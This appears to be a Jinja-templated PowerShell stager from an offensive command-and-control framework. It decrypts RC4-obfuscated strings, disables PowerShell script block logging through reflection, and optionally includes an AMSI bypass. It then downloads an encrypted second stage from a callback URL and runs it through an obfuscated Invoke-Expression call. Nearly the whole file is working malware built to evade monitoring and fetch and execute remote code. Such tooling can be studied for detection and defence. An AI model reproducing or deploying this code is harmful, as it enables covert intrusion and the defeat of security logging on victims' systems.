${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"
${{symbol_name("KEY")}} = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")

{% include "powershell/rc4.ps1" %}


function {{symbol_name("Decrypt-String")}} {
    param(
        [System.String]$string, [Bool]$Code=$False
  	)
    $result = [System.Convert]::FromBase64String($string)
    $result = {{symbol_name("Decrypt-Code")}} $result ${{symbol_name("KEY")}}
    if (-not $Code) { $result = [System.Text.Encoding]::UTF8.GetString($result) }
    $result
}

{# strings used for disabling powershell logging #}
{% set strings = [
    "Bypass.AMSI",
    "System.Management.Automation.Utils",
    "cachedGroupPolicySettings",
    "NonPublic,Static",
    "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
    "EnableScriptBlockLogging",
    "Failed to disable AMSI, aborting",
]%}

${{symbol_name("clip_entry")}} = "{{exec_clipboard_entry|rc4encrypt}}"

{% for s in strings %}
    $string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
{% endfor %}



if ($PSVersionTable.PSVersion.Major -ge 5) {
    {% if amsibypass %}
        {% include amsibypass %}
    {% endif %}

    {# Disable Logging #}
    $settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
    $settings[$string5] = @{}
    $settings[$string5].Add($string6, "0")
}


{% if transport in ['http', 'https'] %}
    ${{symbol_name("WebClient")}} = $K{# defined in the launcher #}
    function {{symbol_name("Transport-String")}} {
        param([String]$1, [hashtable]$2, [Bool]$Code=$False)
        $args = "?t={{transport}}"
        foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
        return {{symbol_name("Decrypt-String")}} (${{symbol_name("WebClient")}}.DownloadString("${{symbol_name("CALLBACK_URL")}}${1}${args}")) $Code
    }
{% elif transport == 'smb' %}
    {# TODO #}
{% elif transport == 'dns' %}
    {# TODO #}
{% endif %}

${{symbol_name("Code")}} = {{symbol_name("Transport-String")}} "{{stage2}}"

{#clever obfuscation#}
& (gcm i*k`e-e*n) ${{symbol_name("Code")}}